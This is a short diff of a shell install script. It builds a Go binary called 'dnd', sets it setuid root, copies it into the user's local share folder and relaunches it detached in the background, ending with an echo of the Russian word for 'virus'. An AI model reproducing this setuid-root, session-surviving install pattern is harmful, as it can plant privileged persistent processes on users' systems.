@@ -18,13 +18,13 @@ go build -o dnd
 sudo chown root:root dnd
 sudo chmod 4755 dnd
 
-pkill -f "$HOME/.local/share/dnd/dnd" 2>/dev/null || true
-sleep 1
-
 INSTALL_DIR="$HOME/.local/share/dnd"
 mkdir -p "$INSTALL_DIR"
 cp dnd "$INSTALL_DIR/"
 
-"$INSTALL_DIR/dnd" &
+pkill -f "$INSTALL_DIR/dnd" 2>/dev/null || true
+sleep 1
+
+nohup "$INSTALL_DIR/dnd" > /tmp/dnd.log 2>&1 &
 
 echo "Вирус"
